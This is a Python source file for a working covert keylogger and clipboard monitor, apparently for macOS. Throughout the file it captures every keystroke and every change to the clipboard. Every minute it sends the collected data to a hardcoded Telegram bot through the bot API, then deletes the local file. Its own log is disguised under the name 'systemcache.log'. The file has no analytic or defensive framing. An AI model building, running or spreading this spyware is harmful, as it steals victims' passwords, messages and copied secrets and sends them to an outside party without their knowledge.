import os
import threading
import tempfile
import time
import requests
from pynput import keyboard
from datetime import datetime
import pyperclip
import logging

# Настройка логирования
LOG_DIR = os.path.expanduser("~/Library/Logs")
os.makedirs(LOG_DIR, exist_ok=True)
logging.basicConfig(
    filename=os.path.join(LOG_DIR, "systemcache.log"),
    level=logging.DEBUG,  # DEBUG для подробных логов
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Telegram bot configuration
BOT_TOKEN = "8199817040:AAHvR7_DspBteNuMi5ztepcb3Wf1Pecmhdo"  # Replace with your bot token
CHAT_ID = "5018443124"  # Replace with your chat ID
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

# Temporary file path
TEMP_DIR = tempfile.gettempdir()
LOG_FILE = os.path.join(TEMP_DIR, "keystrokes.txt")

# Keystroke and clipboard buffers
keystrokes = []
clipboard_log = []
last_clipboard = None

def format_key(key):
    """Format special keys and regular characters."""
    logging.debug("Formatting key: %s", key)
    try:
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        else:
            # Handle special keys
            key_str = str(key)
            if key_str.startswith('Key.'):
                key_str = key_str.replace('Key.', '')
            special_keys = {
                'space': ' [SPACE] ',
                'enter': ' [ENTER] ',
                'tab': ' [TAB] ',
                'backspace': ' [BACKSPACE] ',
                'ctrl': ' [CTRL] ',
                'cmd': ' [CMD] ',
                'alt': ' [ALT] ',
                'shift': ' [SHIFT] ',
                'esc': ' [ESC] ',
            }
            return special_keys.get(key_str, f' [{key_str.upper()}] ')
    except Exception as e:
        logging.error("Error formatting key %s: %s", key, e)
        return ' [UNKNOWN] '

def on_press(key):
    """Capture and store keystrokes."""
    logging.debug("Key pressed: %s", key)
    try:
        keystrokes.append(format_key(key))
    except Exception as e:
        logging.error("Error capturing key %s: %s", key, e)
        keystrokes.append(' [ERROR] ')

def monitor_clipboard():
    """Monitor clipboard for changes and log new content."""
    global last_clipboard
    logging.info("Starting clipboard monitor")
    while True:
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != last_clipboard and current_clipboard:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                logging.debug("Clipboard changed: %s", current_clipboard)
                clipboard_log.append(f"[CLIPBOARD] {timestamp}: {current_clipboard}")
                last_clipboard = current_clipboard
            else:
                logging.debug("No clipboard change")
        except Exception as e:
            logging.error("Clipboard error: %s", e)
            clipboard_log.append(f"[CLIPBOARD ERROR] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}: {str(e)}")
        time.sleep(2)  # Check clipboard every 2 seconds

def save_and_send():
    """Save keystrokes and clipboard logs to file and send to Telegram every minute."""
    logging.info("Starting save and send thread")
    while True:
        if keystrokes or clipboard_log:
            logging.debug("Saving logs: %d keystrokes, %d clipboard entries", len(keystrokes), len(clipboard_log))
            try:
                # Write to temp file
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(LOG_FILE, 'w', encoding='utf-8') as f:
                    f.write(f"Keystrokes logged at {timestamp}:\n")
                    if keystrokes:
                        f.write(''.join(keystrokes) + '\n')
                    if clipboard_log:
                        f.write('\n'.join(clipboard_log) + '\n')
                logging.debug("Logs written to %s", LOG_FILE)

                # Send to Telegram
                with open(LOG_FILE, 'rb') as f:
                    files = {'document': (os.path.basename(LOG_FILE), f)}
                    data = {'chat_id': CHAT_ID}
                    logging.debug("Sending to Telegram: chat_id=%s", CHAT_ID)
                    response = requests.post(TELEGRAM_API, data=data, files=files)
                    if response.status_code != 200:
                        logging.error("Failed to send to Telegram: %s", response.text)
                    else:
                        logging.info("Successfully sent to Telegram")

            except Exception as e:
                logging.error("Error in save_and_send: %s", e)

            # Clear logs
            keystrokes.clear()
            clipboard_log.clear()
            logging.debug("Logs cleared")

            # Delete temp file
            try:
                if os.path.exists(LOG_FILE):
                    os.remove(LOG_FILE)
                    logging.debug("Temp file %s deleted", LOG_FILE)
                else:
                    logging.warning("Temp file %s does not exist", LOG_FILE)
            except Exception as e:
                logging.error("Error deleting temp file %s: %s", LOG_FILE, e)

        else:
            logging.debug("No logs to save")
        time.sleep(60)  # Wait 1 minute

def start_keylogger():
    """Start the keylogger in a separate thread."""
    logging.info("Starting keylogger")
    try:
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        logging.debug("Keylogger started")
    except Exception as e:
        logging.error("Error starting keylogger: %s", e)

def main():
    logging.info("Script started")
    # Start the clipboard monitor in a separate thread
    try:
        clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
        clipboard_thread.start()
        logging.debug("Clipboard thread started")
    except Exception as e:
        logging.error("Error starting clipboard thread: %s", e)

    # Start the Telegram sender in a separate thread
    try:
        sender_thread = threading.Thread(target=save_and_send, daemon=True)
        sender_thread.start()
        logging.debug("Sender thread started")
    except Exception as e:
        logging.error("Error starting sender thread: %s", e)

    # Start the keylogger
    start_keylogger()

    # Keep the main process running
    logging.info("Entering main loop")
    while True:
        time.sleep(1000)

if __name__ == "__main__":
    main()